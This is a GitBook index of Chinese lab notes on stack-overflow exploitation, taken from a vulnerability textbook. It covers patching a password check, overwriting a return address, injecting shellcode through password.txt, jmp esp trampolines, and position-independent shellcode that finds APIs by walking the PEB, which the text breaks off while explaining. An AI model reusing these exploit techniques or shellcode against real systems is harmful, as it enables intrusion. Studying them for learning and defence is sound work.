{"./":{"url":"./","title":"Introduction","keywords":"","body":"Introduction This is whuwzp's wiki system! Copyright © whuwzp.top 2018 all right reserved，powered by Gitbook本文档修订时间： 2018-06-30 14:50:51 "},"source/post/0day/1/1/1.html":{"url":"source/post/0day/1/1/1.html","title":"基础知识","keywords":"","body":" ida 首先用ida找到关键代码：在记下内存位置，0x0040106E，进入olly .text:00401046 push offset aPleaseInputPas ; \"please input password: \" .text:0040104B call _printf .text:00401050 lea eax, [esp+404h+var_400] .text:00401054 push eax .text:00401055 push offset aS ; \"%s\" .text:0040105A call _scanf .text:0040105F lea ecx, [esp+40Ch+var_400] .text:00401063 push ecx .text:00401064 call sub_401000 .text:00401069 add esp, 10h .text:0040106C test eax, eax .text:0040106E jz short loc_40107F .text:00401070 push offset aIncorrectPassw ; \"incorrect password!\\n\\n\" .text:00401075 call _printf .text:0040107A add esp, 4 .text:0040107D jmp short loc_401046 .text:0040107F ; --------------------------------------------------------------------------- .text:0040107F .text:0040107F loc_40107F: ; CODE XREF: _main+2E\u0018j .text:0040107F push offset aCongratulation ; \"Congratulation! You have passed the ver\"... .text:00401084 call _printf ollydbg 快捷键ctrl+g: 0040106E，跳转至关键代码处修改 将jz改为jnz，发现机器码由74变为75 LoadPE 用LoadPE打开并修改exe，VA=0x0040106E，用工具计算得RVA=0x0000026E hex 在十六进制编辑器中修改 result 最终输入错误仍能通过 Copyright © whuwzp.top 2018 all right reserved，powered by Gitbook本文档修订时间： 2018-09-23 12:08:31 "},"source/post/0day/2/1/1.html":{"url":"source/post/0day/2/1/1.html","title":"覆盖邻接变量]","keywords":"","body":"实验一 ida 首先用ida找到关键代码：在记下内存位置，0x0040106E，进入olly .text:00401046 push offset aPleaseInputPas ; \"please input password: \" .text:0040104B call _printf .text:00401050 lea eax, [esp+404h+var_400] .text:00401054 push eax .text:00401055 push offset aS ; \"%s\" .text:0040105A call _scanf .text:0040105F lea ecx, [esp+40Ch+var_400] .text:00401063 push ecx .text:00401064 call sub_401000 .text:00401069 add esp, 10h .text:0040106C test eax, eax .text:0040106E jz short loc_40107F .text:00401070 push offset aIncorrectPassw ; \"incorrect password!\\n\\n\" .text:00401075 call _printf .text:0040107A add esp, 4 .text:0040107D jmp short loc_401046 .text:0040107F ; --------------------------------------------------------------------------- .text:0040107F .text:0040107F loc_40107F: ; CODE XREF: _main+2E\u0018j .text:0040107F push offset aCongratulation ; \"Congratulation! You have passed the ver\"... .text:00401084 call _printf ollydbg 快捷键ctrl+g: 0040106E，跳转至关键代码处修改 找到基本逻辑，按\";\"键注释出对应的函数，便于后期查看 并设置断点，按\"F2\"键设置，便于调试。 我们输入8个1，开始调试，在未进行strcpy时的[ebp-4]的值为0xFFFFFFFF（strcmp的功能见附录） 'strcpy'后的值为0xFFFFFF00，因为buf的8个字节复制为0x31后，由于字符串会自带0x00，所以覆盖了auth变量的末尾 我们输入8个z(本节的情况，应该只要ASCII值大于1的ASCII即可)，开始调试，在未进行strcpy时的[ebp-4]的值为0x00000001（strcmp的功能见附录） 'strcpy'后的值为0x00000000，覆盖了auth变量的末尾的0x01 刚好是可以通过验证的 附录 strcmp(s1,s2) 比较两字符串的大小（从左往右比较字符的ASCII值），返回值情况如下: s1 \\ s1 = s2, 0 s1 > s2, 1 Copyright © whuwzp.top 2018 all right reserved，powered by Gitbook本文档修订时间： 2018-09-23 04:49:27 "},"source/post/0day/2/2/2.html":{"url":"source/post/0day/2/2/2.html","title":"覆盖返回地址","keywords":"","body":"实验二 ida 首先用ida找到关键代码（“incorrect”）：在记下内存位置，进入olly //main函数 .text:00401090 var_448 = byte ptr -448h .text:00401090 File = dword ptr -408h .text:00401090 Str1 = byte ptr -404h .text:00401090 var_4 = dword ptr -4 .text:00401090 argc = dword ptr 8 .text:00401090 argv = dword ptr 0Ch .text:00401090 envp = dword ptr 10h .text:00401090 .text:00401090 push ebp .text:00401091 mov ebp, esp .text:00401093 sub esp, 448h .text:00401099 push ebx .text:0040109A push esi .text:0040109B push edi .text:0040109C lea edi, [ebp+var_448] .text:004010A2 mov ecx, 112h .text:004010A7 mov eax, 0CCCCCCCCh .text:004010AC rep stosd .text:004010AE mov [ebp+var_4], 0 .text:004010B5 push offset Mode ; \"rw+\" .text:004010BA push offset Filename ; \"password.txt\" .text:004010BF call _fopen .text:004010C4 add esp, 8 .text:004010C7 mov [ebp+File], eax .text:004010CD cmp [ebp+File], 0 .text:004010D4 jnz short loc_4010E0 .text:004010D6 push 0 ; Code .text:004010D8 call _exit .text:004010DD ; --------------------------------------------------------------------------- .text:004010DD add esp, 4 .text:004010E0 .text:004010E0 loc_4010E0: ; CODE XREF: _main+44\u0018j .text:004010E0 lea eax, [ebp+Str1] .text:004010E6 push eax .text:004010E7 push offset Format ; \"%s\" .text:004010EC mov ecx, [ebp+File] .text:004010F2 push ecx ; File .text:004010F3 call _fscanf .text:004010F8 add esp, 0Ch .text:004010FB lea edx, [ebp+Str1] .text:00401101 push edx ; Str1 .text:00401102 call j__verify_password .text:00401107 add esp, 4 .text:0040110A mov [ebp+var_4], eax .text:0040110D cmp [ebp+var_4], 0 .text:00401111 jz short loc_401122 .text:00401113 push offset aIncorrectPassw ; \"incorrect password!\\n\" .text:00401118 call _printf .text:0040111D add esp, 4 .text:00401120 jmp short loc_40112F .text:00401122 ; --------------------------------------------------------------------------- .text:00401122 .text:00401122 loc_401122: ; CODE XREF: _main+81\u0018j .text:00401122 push offset aCongratulation ; \"Congratulation! You have passed the ver\"... .text:00401127 call _printf .text:0040112C add esp, 4 .text:0040112F .text:0040112F loc_40112F: ; CODE XREF: _main+90\u0018j .text:0040112F mov eax, [ebp+File] .text:00401135 push eax ; File .text:00401136 call _fclose .text:0040113B add esp, 4 .text:0040113E pop edi .text:0040113F pop esi .text:00401140 pop ebx .text:00401141 add esp, 448h .text:00401147 cmp ebp, esp .text:00401149 call __chkesp .text:0040114E mov esp, ebp .text:00401150 pop ebp .text:00401151 retn .text:00401151 _main endp //verify_password .text:00401020 var_4C = byte ptr -4Ch .text:00401020 Dest = byte ptr -0Ch .text:00401020 var_4 = dword ptr -4 .text:00401020 Str1 = dword ptr 8 .text:00401020 .text:00401020 push ebp .text:00401021 mov ebp, esp .text:00401023 sub esp, 4Ch .text:00401026 push ebx .text:00401027 push esi .text:00401028 push edi .text:00401029 lea edi, [ebp+var_4C] .text:0040102C mov ecx, 13h .text:00401031 mov eax, 0CCCCCCCCh .text:00401036 rep stosd .text:00401038 push offset Str2 ; \"1234567\" .text:0040103D mov eax, [ebp+Str1] .text:00401040 push eax ; Str1 .text:00401041 call _strcmp .text:00401046 add esp, 8 .text:00401049 mov [ebp+var_4], eax .text:0040104C mov ecx, [ebp+Str1] .text:0040104F push ecx ; Source .text:00401050 lea edx, [ebp+Dest] .text:00401053 push edx ; Dest .text:00401054 call _strcpy .text:00401059 add esp, 8 .text:0040105C mov eax, [ebp+var_4] .text:0040105F pop edi .text:00401060 pop esi .text:00401061 pop ebx .text:00401062 add esp, 4Ch .text:00401065 cmp ebp, esp .text:00401067 call __chkesp .text:0040106C mov esp, ebp .text:0040106E pop ebp .text:0040106F retn .text:0040106F _verify_password endp ollydbg 快捷键ctrl+g,，跳转至关键代码处修改 直接找到跳转至成功验证的地址，0x00401122处 修改password.txt，因为要利用buffer覆盖以后的返回地址，需要2个DWORD+1个int型auth+1个ebp+覆盖的地址0x00401122 进入ollydbg，打开进入verify函数部分，运行至strcpy前的寄存器状态 寄存器之后的状态 刚好是可以通过验证的 Copyright © whuwzp.top 2018 all right reserved，powered by Gitbook本文档修订时间： 2018-09-23 04:48:38 "},"source/post/0day/2/3/3.html":{"url":"source/post/0day/2/3/3.html","title":"植入代码","keywords":"","body":"实验三 这次的实验出了些小意外（user32.dll中messagebox的入口地址不一致），不过很好的解决了，感觉很有意思 源码： /***************************************************************************** To be the apostrophe which changed \"Impossible\" into \"I'm possible\"! POC code of chapter 2.4 in book \"Vulnerability Exploit and Analysis Technique\" file name : stack_overflow_exec.c author : failwest date : 2006.10.1 description : demo show how to redirect EIP to executed extra binary code in buffer Noticed : should be complied with VC6.0 and build into debug version the address of MessageboxA and the start of machine code in buffer have to be make sure in file \"password.txt\" via runtime debugging version : 1.0 E-mail : failwest@gmail.com Only for educational purposes enjoy the fun from exploiting :) ******************************************************************************/ #include #include #define PASSWORD \"1234567\" int verify_password (char *password) { int authenticated; char buffer[44]; authenticated=strcmp(password,PASSWORD); strcpy(buffer,password);//over flowed here! return authenticated; } main() { int valid_flag=0; char password[1024]; FILE * fp; LoadLibrary(\"user32.dll\");//prepare for messagebox if(!(fp=fopen(\"password.txt\",\"rw+\"))) { exit(0); } fscanf(fp,\"%s\",password); valid_flag = verify_password(password); if(valid_flag) { printf(\"incorrect password!\\n\"); } else { printf(\"Congratulation! You have passed the verification!\\n\"); } fclose(fp); } password.txt的十六进制如下： 33db 5368 7765 7374 6866 6169 6c8b c453 5050 53b8 1efd cb7d ffd0 9090 9090 9090 9090 9090 9090 9090 9090 9090 9090 9990 9090 9090 b4fa 1800 ida 首先用ida找到关键代码（“incorrect”）：在记下内存位置，进入olly //main函数 .text:0040106F .text:0040106F ; --------------------------------------------------------------------------- .text:00401070 db 20h dup(0CCh) .text:00401090 .text:00401090 ; =============== S U B R O U T I N E ======================================= .text:00401090 .text:00401090 ; Attributes: bp-based frame .text:00401090 .text:00401090 ; int __cdecl main(int argc, const char **argv, const char **envp) .text:00401090 _main proc near ; CODE XREF: _main_0\u0018j .text:00401090 .text:00401090 var_448 = byte ptr -448h .text:00401090 File = dword ptr -408h .text:00401090 Str1 = byte ptr -404h .text:00401090 var_4 = dword ptr -4 .text:00401090 argc = dword ptr 8 .text:00401090 argv = dword ptr 0Ch .text:00401090 envp = dword ptr 10h .text:00401090 .text:00401090 push ebp .text:00401091 mov ebp, esp .text:00401093 sub esp, 448h .text:00401099 push ebx .text:0040109A push esi .text:0040109B push edi .text:0040109C lea edi, [ebp+var_448] .text:004010A2 mov ecx, 112h .text:004010A7 mov eax, 0CCCCCCCCh .text:004010AC rep stosd .text:004010AE mov [ebp+var_4], 0 .text:004010B5 mov esi, esp .text:004010B7 push offset LibFileName ; \"user32.dll\" .text:004010BC call ds:__imp__LoadLibraryA@4 ; LoadLibraryA(x) .text:004010C2 cmp esi, esp .text:004010C4 call __chkesp .text:004010C9 push offset Mode ; \"rw+\" .text:004010CE push offset Filename ; \"password.txt\" .text:004010D3 call _fopen .text:004010D8 add esp, 8 .text:004010DB mov [ebp+File], eax .text:004010E1 cmp [ebp+File], 0 .text:004010E8 jnz short loc_4010F1 .text:004010EA push 0 ; Code .text:004010EC call _exit .text:004010F1 ; --------------------------------------------------------------------------- .text:004010F1 .text:004010F1 loc_4010F1: ; CODE XREF: _main+58\u0018j .text:004010F1 lea eax, [ebp+Str1] .text:004010F7 push eax .text:004010F8 push offset Format ; \"%s\" .text:004010FD mov ecx, [ebp+File] .text:00401103 push ecx ; File .text:00401104 call _fscanf .text:00401109 add esp, 0Ch .text:0040110C lea edx, [ebp+Str1] .text:00401112 push edx ; Str1 .text:00401113 call j__verify_password .text:00401118 add esp, 4 .text:0040111B mov [ebp+var_4], eax .text:0040111E cmp [ebp+var_4], 0 .text:00401122 jz short loc_401133 .text:00401124 push offset aIncorrectPassw ; \"incorrect password!\\n\" .text:00401129 call _printf .text:0040112E add esp, 4 .text:00401131 jmp short loc_401140 .text:00401133 ; --------------------------------------------------------------------------- .text:00401133 .text:00401133 loc_401133: ; CODE XREF: _main+92\u0018j .text:00401133 push offset aCongratulation ; \"Congratulation! You have passed the ver\"... .text:00401138 call _printf .text:0040113D add esp, 4 .text:00401140 .text:00401140 loc_401140: ; CODE XREF: _main+A1\u0018j .text:00401140 mov eax, [ebp+File] .text:00401146 push eax ; File .text:00401147 call _fclose .text:0040114C add esp, 4 .text:0040114F pop edi .text:00401150 pop esi .text:00401151 pop ebx .text:00401152 add esp, 448h .text:00401158 cmp ebp, esp .text:0040115A call __chkesp .text:0040115F mov esp, ebp .text:00401161 pop ebp .text:00401162 retn .text:00401162 _main endp //verify_password .text:00401020 ; int __cdecl verify_password(char *Str1) .text:00401020 _verify_password proc near ; CODE XREF: j__verify_password\u0018j .text:00401020 .text:00401020 var_70 = byte ptr -70h .text:00401020 Dest = byte ptr -30h .text:00401020 var_4 = dword ptr -4 .text:00401020 Str1 = dword ptr 8 .text:00401020 .text:00401020 push ebp .text:00401021 mov ebp, esp .text:00401023 sub esp, 70h .text:00401026 push ebx .text:00401027 push esi .text:00401028 push edi .text:00401029 lea edi, [ebp+var_70] .text:0040102C mov ecx, 1Ch .text:00401031 mov eax, 0CCCCCCCCh .text:00401036 rep stosd .text:00401038 push offset Str2 ; \"1234567\" .text:0040103D mov eax, [ebp+Str1] .text:00401040 push eax ; Str1 .text:00401041 call _strcmp .text:00401046 add esp, 8 .text:00401049 mov [ebp+var_4], eax .text:0040104C mov ecx, [ebp+Str1] .text:0040104F push ecx ; Source .text:00401050 lea edx, [ebp+Dest] .text:00401053 push edx ; Dest .text:00401054 call _strcpy .text:00401059 add esp, 8 .text:0040105C mov eax, [ebp+var_4] .text:0040105F pop edi .text:00401060 pop esi .text:00401061 pop ebx .text:00401062 add esp, 70h .text:00401065 cmp ebp, esp .text:00401067 call __chkesp .text:0040106C mov esp, ebp .text:0040106E pop ebp .text:0040106F retn .text:0040106F _verify_password endp ollydbg 快捷键ctrl+g,，跳转至关键代码处修改，这里我们直接找到溢出的关键点strcpy函数，图为执行strcpy前 修改password.txt，因为要利用buffer覆盖以后的返回地址，由上图，将返回地址设为0x0018FAB8，即shellcode的起始位置，使其开始运行shellcode，图为执行strcpy后 继续运行，可以发现已经执行到了我们的shellcode，图为执行我们认为的MessageBox的地址前（实际在这里之前是出错的，因为之前给的MessageBox的入口地址和我电脑上的不符，所以需要重新获取，获取方法见附录） 继续运行，成功弹出 附录 MessageBox函数入口地址探究 书中写的用VC中的dependecy walker tools查看，益凡说是不行，可能是因为地址随机化，于是探究了一会儿，最终利用GetProcAddress这个函数找到MessageBox，将源码改为： /***************************************************************************** To be the apostrophe which changed \"Impossible\" into \"I'm possible\"! POC code of chapter 2.4 in book \"Vulnerability Exploit and Analysis Technique\" file name : stack_overflow_exec.c author : failwest date : 2006.10.1 description : demo show how to redirect EIP to executed extra binary code in buffer Noticed : should be complied with VC6.0 and build into debug version the address of MessageboxA and the start of machine code in buffer have to be make sure in file \"password.txt\" via runtime debugging version : 1.0 E-mail : failwest@gmail.com Only for educational purposes enjoy the fun from exploiting :) ******************************************************************************/ #include #include #define PASSWORD \"1234567\" int verify_password (char *password) { int authenticated; char buffer[44]; authenticated=strcmp(password,PASSWORD); strcpy(buffer,password);//over flowed here! return authenticated; } main() { int valid_flag=0; char password[1024]; FILE * fp; HINSTANCE h = LoadLibrary(\"user32.dll\");//prepare for messagebox，修改部分 GetProcAddress(h,\"MessageBoxA\");//增加部分 if(!(fp=fopen(\"password.txt\",\"rw+\"))) { exit(0); } fscanf(fp,\"%s\",password); valid_flag = verify_password(password); if(valid_flag) { printf(\"incorrect password!\\n\"); } else { printf(\"Congratulation! You have passed the verification!\\n\"); } fclose(fp); } 主要修改了 HINSTANCE h = LoadLibrary(\"user32.dll\");//prepare for messagebox，修改部分 GetProcAddress(h,\"MessageBoxA\");//增加部分 olly运行至getprocaddress前，可以看出eax中为user32.dll的句柄（loadlibrary的返回值） 执行后，eax的值即为MessageBox的入口地址，将其改写到password.txt对应位置，然后就可以成功运行了 Copyright © whuwzp.top 2018 all right reserved，powered by Gitbook本文档修订时间： 2018-09-23 04:49:22 "},"source/post/0day/3/1/1.html":{"url":"source/post/0day/3/1/1.html","title":"esp跳板","keywords":"","body":"实验一 方法是用jmp esp作为跳板，使植入代码更具兼容性。步骤性的主要是将返回地址覆盖为jmp esp指令的地址（dll中查询），然后此时shellcode应该恰好在esp所指向的地址，开始执行。 原理比较简单，不再重复之前的步骤了，这里只着重说明出现的问题和解决方法。主要有： user32.dll中没有找到jmp esp指令； messagebox地址不定；（这个用上一节的方法） jmp esp 大神找指令的源码，原理比较简单，loadliabrary拿到dll的句柄，依次往后对比找到0xFFE4（jmp esp的机器码），然而并没有找到。于是我就想着自己写一个含有jmp esp的dll，取代user32.dll。 写dll 这个方法类似\"machine_code\"中的asm写指令。源码如下： 注：我们在编译时还需要将base基址修改下，例如0x11110000，而不是默认的0x10000000，原因见找jmp esp指令小节。 // jmp_esp.cpp : Defines the entry point for the DLL application. // #include \"stdafx.h\" BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { return TRUE; } void jump() { _asm{ jmp esp } } 最开始的时候我写的是： // jmp_esp.cpp : Defines the entry point for the DLL application. // #include \"stdafx.h\" BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { _asm{ jmp esp } return TRUE; } 但是这样是执行，没有导出函数，实际就是自己执行了，我们需要的是一个函数中的一段代码，所以放在jump函数中才可以。 找jmp esp的地址 用大神的程序或者ida打开dll直接找，找到了0x10001068： 设置password.txt 在olly中测试 然而原本0x10001068结果变成了0x00001068，一直没搞不明白为啥，原因找到了，是因为0x00结尾，字符串被截断。 于是我们就需要修改代码，使jmp esp的地址尽量不要含有0x00，于是要么就改源码，但是想到可以修改编译时的基址，直接改为0x11110000，毕竟改源码不可能变动太大，始终可能含有0x1000xxxx，如图： 最后再找地址得到 0x10001068，如图： 注：需把jmp_esp.dll放在c/windows/system32/路径下，或者写dll的全路径（再或者设置环境变量） 编辑shellcode地址 MessageBox地址 修改源码 修改之前的溢出源码如下： /***************************************************************************** To be the apostrophe which changed \"Impossible\" into \"I'm possible\"! POC code of chapter 2.4 in book \"Vulnerability Exploit and Analysis Technique\" file name : stack_overflow_exec.c author : failwest date : 2006.10.1 description : demo show how to redirect EIP to executed extra binary code in buffer Noticed : should be complied with VC6.0 and build into debug version the address of MessageboxA and the start of machine code in buffer have to be make sure in file \"password.txt\" via runtime debugging version : 1.0 E-mail : failwest@gmail.com Only for educational purposes enjoy the fun from exploiting :) ******************************************************************************/ #include #include #define PASSWORD \"1234567\" int verify_password (char *password) { int authenticated; char buffer[44]; authenticated=strcmp(password,PASSWORD); strcpy(buffer,password);//over flowed here! return authenticated; } main() { HINSTANCE jmp = LoadLibrary(\"jmp_esp.dll\");//加载我们的dll，为了拿jmp_esp的地址 int valid_flag=0; char password[1024]; FILE * fp; //LoadLibrary(\"jmp_esp.dll\");//prepare for messagebox HINSTANCE MsgBox = LoadLibrary(\"user32.dll\");//messagebox GetProcAddress(MsgBox,\"MessageBoxA\");//为了拿到messagebox的入口地址 if(!(fp=fopen(\"password.txt\",\"rw+\"))) { exit(0); } fscanf(fp,\"%s\",password); valid_flag = verify_password(password); if(valid_flag) { printf(\"incorrect password!\\n\"); } else { printf(\"Congratulation! You have passed the verification!\\n\"); } fclose(fp); } 注：好像不能用loadliabrary直接多个dll，必须得用HINSTANCE jmp =和HINSTANCE Msg =和 开始测试 原理同之前的，进入olly，可以看到jmp_esp.dll的句柄（基址）为0x11110000了已经 拿到MessageBox的地址： 查看运行至jmp esp，堆栈情况： 成功： 附录 找指令函数 0xFFE4是jmp esp的机器码，而原理就是拿到dll的句柄（基址），依次比对0xFFE4 /***************************************************************************** To be the apostrophe which changed \"Impossible\" into \"I'm possible\"! POC code of chapter 3.2 in book \"Vulnerability Exploit and Analysis Technique\" file name : search_opcode.cpp author : failwest date : 2006.10.7 description : used to search addresses of jump instruction in memory Noticed : code can be changed easily to search different instruction in different file version : 1.0 E-mail : failwest@gmail.com Only for educational purposes enjoy the fun from exploiting :) ******************************************************************************/ //FF E0 JMP EAX //FF E1 JMP ECX //FF E2 JMP EDX //FF E3 JMP EBX //FF E4 JMP ESP //FF E5 JMP EBP //FF E6 JMP ESI //FF E7 JMP EDI //FF D0 CALL EAX //FF D1 CALL ECX //FF D2 CALL EDX //FF D3 CALL EBX //FF D4 CALL ESP //FF D5 CALL EBP //FF D6 CALL ESI //FF D7 CALL EDI //#define DLL_NAME \"mfc42.dll\" #include #include #define DLL_NAME \"jmp_esp.dll\" main() { BYTE* ptr; int position,address; HINSTANCE handle; BOOL done_flag = FALSE; handle=LoadLibrary(DLL_NAME); if(!handle) { printf(\" load dll erro !\"); exit(0); } ptr = (BYTE*)handle; for(position = 0; !done_flag; position++) { try { if(ptr[position] == 0xFF && ptr[position+1] == 0xE4) { //0xFFE4 is the opcode of jmp esp int address = (int)ptr + position; printf(\"OPCODE found at 0x%x\\n\",address); } } catch(...) { int address = (int)ptr + position; printf(\"END OF 0x%x\\n\", address); done_flag = true; } } } Copyright © whuwzp.top 2018 all right reserved，powered by Gitbook本文档修订时间： 2018-09-23 04:49:16 "},"source/post/0day/3/2/2.html":{"url":"source/post/0day/3/2/2.html","title":"自定位API","keywords":"","body":" 涉及PEB、TEB，dll等加载地址获取各个导出函数的入口地址的内容 原理 本实验是为了让shellcode更具有适用性，所以采取自动定位API的方式。这里带来不适用性的原因可能是静态获取的kernel.dll等的\"jmp esp\"的地址（虽然上一个实验并没有用到）可能不适用于其他系统版本、补丁等，所以我们需要自动定位，定位loadlibrary,exitprocess和messagebox等。 我们的目的是找到messagebox的入口地址并调用，所以先要加载user32.dll，所以先要用loadlibrary函数（kernel.dll中），所以先要弄到kernel.dll的地址，然后找到loadlibrary的入口地址，再调用之，再找到messagebox的入口地址。 步骤 段选择字FS再内存中找到当前的TEB地址； TEB+0x30=PEB的指针，即进程 PEB+0x0C=PEB_LDR_DATA的地址；（这部分见附录详细介绍） PEB_LDR_DATA中存放着三个链表结构，其中第三个就是初始化模块InInitializationOrderModulist的信息（也是第一个链表结点）； InInitializationOrderModulist的第一个结点是ntdll.dll，第二个是kernelbase.dll（winxp中没有这一项），第三个就是我们需要的kernel.dll，链表flink的方法可是链到我们需要的dll的位置； kernel结点地址+0x08=kernel.dll的加载地址； kernel.dll的加载地址+0x3C=PE头； PE+0x78=导出表Export_Table； Export_Table+0x20=函数名表，Export_Table+0x1C=函数入口地址表，函数名表和函数入口地址中函数顺序相同，一一对应，所以先用函数名表匹配到(采用了hash匹配提高效率)我们要找的loadlibrary函数的index，就可以用这个index找该函数的入口地址； 于是可以调用loadliabrary，加载user32.dll，然后类似7-9的方法就可以拿到messagebox了（loadlibrary的返回值eax就是user32.dll的加载地址了） 剩下的比较简单，不再赘述。 Bug和Debug Bug： exe不能正常运行； 原因：winxp和win7加载的dll略有不同，win7多了一个kernelbase.dll，详见本书P389或附录； Debug：再加一句链表的下一跳指令 实验 ida-windbg 由于ollydbg调试出了些问题，用了ida中的windbg(F9,选择windbg，它调试的快捷键和olly相同)，以下是我作了注释的汇编码，总体来说设计的非常巧妙。（P92有一张逻辑图） .text:0040102E push 1E380A6Ah ; messsagebox .text:00401033 push 4FD18963h ; exitprocess .text:00401038 push 0C917432h ; loadlibrary .text:0040103D mov esi, esp ; 全靠esi标记这三个的地址 .text:0040103F lea edi, [esi-0Ch] .text:00401042 xor ebx, ebx .text:00401044 mov bh, 4 .text:00401046 sub esp, ebx .text:00401048 mov bx, 3233h .text:0040104C push ebx .text:0040104D push 72657375h ; user32的字符串 .text:00401052 push esp .text:00401053 xor edx, edx .text:00401055 mov ebx, fs:[edx+30h] .text:00401059 mov ecx, [ebx+0Ch] .text:0040105C mov ecx, [ecx+1Ch] .text:0040105F mov ecx, [ecx] .text:00401061 mov ecx, [ecx] .text:00401063 mov ebp, [ecx+8] ; ebp = base address of kernel32.dll .text:00401066 .text:00401066 loc_401066: ; CODE XREF: _main_0+AB\u0019j .text:00401066 lodsd ; mov eax [esi]; esi=esi+0x04； .text:00401066 ; eax的值改变的位置（loadlibrary,messagebox等的赋值） .text:00401067 cmp eax, 1E380A6Ah .text:0040106C jnz short loc_401073 ; 大循环的准备阶段，重新确定找的函数名，把导出表地址赋值abx .text:0040106E xchg eax, ebp .text:0040106F call dword ptr [edi-8] ; edi定位各个函数的入口地址，edi-8就是loadliabrary .text:00401072 xchg eax, ebp .text:00401073 .text:00401073 loc_401073: ; CODE XREF: _main_0+5C\u0018j .text:00401073 pusha ; 大循环的准备阶段，重新确定找的函数名，把导出表地址赋值abx .text:00401074 mov eax, [ebp+arg_34] ; PE头 .text:00401077 mov ecx, [ebp+eax+arg_70] .text:0040107B add ecx, ebp .text:0040107D mov ebx, [ecx+20h] .text:00401080 add ebx, ebp .text:00401082 xor edi, edi ; edi计数器 .text:00401084 .text:00401084 loc_401084: ; CODE XREF: _main_0+8E\u0019j .text:00401084 inc edi ; 真正的大循环，for(;hash_result==[esp+...];edi++) .text:00401085 mov esi, [ebx+edi*4] .text:00401088 add esi, ebp .text:0040108A cdq .text:0040108B .text:0040108B loc_40108B: ; CODE XREF: _main_0+88\u0019j .text:0040108B movsx eax, byte ptr [esi] ; hash处理 .text:0040108E cmp al, ah .text:00401090 jz short loc_40109A ; .text:00401092 ror edx, 7 .text:00401095 add edx, eax .text:00401097 inc esi .text:00401098 jmp short loc_40108B ; hash处理 .text:0040109A ; --------------------------------------------------------------------------- .text:0040109A .text:0040109A loc_40109A: ; CODE XREF: _main_0+80\u0018j .text:0040109A cmp edx, [esp+84h+var_68] ; .text:0040109E jnz short loc_401084 ; 真正的大循环，for(;hash_result==[esp+...];edi++) .text:004010A0 mov ebx, [ecx+24h] .text:004010A3 add ebx, ebp .text:004010A5 mov di, [ebx+edi*2] .text:004010A9 mov ebx, [ecx+1Ch] .text:004010AC add ebx, ebp .text:004010AE add ebp, [ebx+edi*4] .text:004010B1 xchg eax, ebp ; 拿到了各个函数的入口地址，赋值给eax .text:004010B2 pop edi .text:004010B3 stosd ; 各个函数入口地址保存于edi所指向的内存空间中 .text:004010B4 push edi .text:004010B5 popa .text:004010B6 cmp eax, 1E380A6Ah ; messagebox,最后找的是messagebox .text:004010BB jnz short loc_401066 ; mov eax [esi]; esi=esi+0x04； .text:004010BB ; eax的值改变的位置（loadlibrary,messagebox等的赋值） .text:004010BD xor ebx, ebx .text:004010BF push ebx .text:004010C0 push 74736577h .text:004010C5 push 6C696166h .text:004010CA mov eax, esp .text:004010CC push ebx .text:004010CD push eax .text:004010CE push eax .text:004010CF push ebx .text:004010D0 call dword ptr [edi-4] ; edi定位函数入口地址 .text:004010D3 push ebx .text:004010D4 call dword ptr [edi-8] 修改后的shellcode源码：（实际就是增加了一行mov ecx, [ecx]），和上面的注释可以对照着看。 /***************************************************************************** To be the apostrophe which changed \"Impossible\" into \"I'm possible\"! POC code of chapter 3.4 in book \"Vulnerability Exploit and Analysis Technique\" file name : shellcode_popup_general.c author : failwest date : 2006.10.20 description : can be run across OS platform and different patch version the code used to generate PE file and extract binary code Noticed : version : 1.0 E-mail : failwest@gmail.com Only for educational purposes enjoy the fun from exploiting :) ******************************************************************************/ int main() { _asm{ nop nop nop nop nop CLD ; clear flag DF ;store hash push 0x1e380a6a ;hash of MessageBoxA push 0x4fd18963 ;hash of ExitProcess push 0x0c917432 ;hash of LoadLibraryA mov esi,esp ; esi = addr of first function hash lea edi,[esi-0xc] ; edi = addr to start writing function ; make some stack space xor ebx,ebx mov bh, 0x04 sub esp, ebx ; push a pointer to \"user32\" onto stack mov bx, 0x3233 ; rest of ebx is null push ebx push 0x72657375 push esp xor edx,edx ; find base addr of kernel32.dll mov ebx, fs:[edx + 0x30] ; ebx = address of PEB mov ecx, [ebx + 0x0c] ; ecx = pointer to loader data mov ecx, [ecx + 0x1c] ; ecx = first entry in initialisation order list mov ecx, [ecx] ; ecx = second entry in list (kernel32.dll) mov ecx, [ecx] ; win7中加上这一行，WinXP中去掉这一行 mov ebp, [ecx + 0x08] ; ebp = base address of kernel32.dll find_lib_functions: lodsd ; load next hash into al and increment esi cmp eax, 0x1e380a6a ; hash of MessageBoxA - trigger ; LoadLibrary(\"user32\") jne find_functions xchg eax, ebp ; save current hash call [edi - 0x8] ; LoadLibraryA xchg eax, ebp ; restore current hash, and update ebp ; with base address of user32.dll find_functions: pushad ; preserve registers mov eax, [ebp + 0x3c] ; eax = start of PE header mov ecx, [ebp + eax + 0x78] ; ecx = relative offset of export table add ecx, ebp ; ecx = absolute addr of export table mov ebx, [ecx + 0x20] ; ebx = relative offset of names table add ebx, ebp ; ebx = absolute addr of names table xor edi, edi ; edi will count through the functions next_function_loop: inc edi ; increment function counter mov esi, [ebx + edi * 4] ; esi = relative offset of current function name add esi, ebp ; esi = absolute addr of current function name cdq ; dl will hold hash (we know eax is small) hash_loop: movsx eax, byte ptr[esi] cmp al,ah jz compare_hash ror edx,7 add edx,eax inc esi jmp hash_loop compare_hash: cmp edx, [esp + 0x1c] ; compare to the requested hash (saved on stack from pushad) jnz next_function_loop mov ebx, [ecx + 0x24] ; ebx = relative offset of ordinals table add ebx, ebp ; ebx = absolute addr of ordinals table mov di, [ebx + 2 * edi] ; di = ordinal number of matched function mov ebx, [ecx + 0x1c] ; ebx = relative offset of address table add ebx, ebp ; ebx = absolute addr of address table add ebp, [ebx + 4 * edi] ; add to ebp (base addr of module) the ; relative offset of matched function xchg eax, ebp ; move func addr into eax pop edi ; edi is last onto stack in pushad stosd ; write function addr to [edi] and increment edi push edi popad ; restore registers ; loop until we reach end of last hash cmp eax,0x1e380a6a jne find_lib_functions function_call: xor ebx,ebx push ebx // cut string push 0x74736577 push 0x6C696166 //push failwest mov eax,esp //load address of failwest push ebx push eax push eax push ebx call [edi - 0x04] ; //call MessageboxA push ebx call [edi - 0x08] ; // call ExitProcess nop nop nop nop } } 代码详解 . 三个函数的hash push 0x1e380a6a;hash of MessageboxA ; push 0x4fd18963;hash of ExitProcess push 0x0c917432;hash of LoadLibraryA mov esi,esp; esi = addr of first function hash lea edi,[esi-0xc]; edi = addr to start 